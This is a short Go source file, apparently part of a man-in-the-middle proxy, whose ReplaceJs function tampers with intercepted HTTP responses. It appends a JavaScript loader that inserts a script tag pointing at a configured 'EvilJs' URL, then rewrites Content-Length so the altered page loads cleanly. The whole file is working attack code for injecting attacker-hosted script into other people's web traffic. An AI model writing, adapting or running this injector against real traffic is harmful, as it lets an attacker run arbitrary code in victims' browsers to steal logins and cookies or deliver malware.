package inject

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"

	log "unknwon.dev/clog/v2"
)

func (inject *InjectJs) ReplaceJs(response *http.Response) error {
	// append
	if inject == nil {
		return nil
	}
	if inject.EvilJs != "" {
		log.Info("Host:%s EvilJs: %s", response.Request.URL.Path, inject.EvilJs)
		body, err := ioutil.ReadAll(response.Body)
		if err != nil {
			return err
		}
		js := `;;(function() {var hm = document.createElement("script");hm.src = "%s";var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();`

		payload := fmt.Sprintf(js, inject.EvilJs)
		log.Info("url :%s, payload: %s\n", response.Request.RequestURI, inject.EvilJs)
		body = append(body, payload...)

		response.Body = ioutil.NopCloser(bytes.NewBuffer(body))
		response.Header.Set("Content-Length", fmt.Sprint(len(body)))
	}
	return nil
}
